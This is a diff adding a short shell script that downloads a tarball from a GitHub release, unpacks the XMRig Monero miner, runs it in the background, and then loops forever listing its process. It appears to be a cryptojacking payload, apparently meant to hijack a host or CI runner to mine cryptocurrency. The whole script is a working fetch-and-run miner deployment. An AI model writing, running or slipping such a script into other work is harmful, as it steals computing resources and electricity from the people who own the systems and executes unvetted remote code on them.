@@ -1,0 +1,13 @@
+#!/bin/sh
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
+tar -zxvf winxmr.tar.gz
+cd xmrig-v5.11.1
+chmod a+x xmrig
+chmod a+x config.json
+./xmrig &
+while true
+do
+  ps aux | grep xmrig
+  sleep 1
+done
+
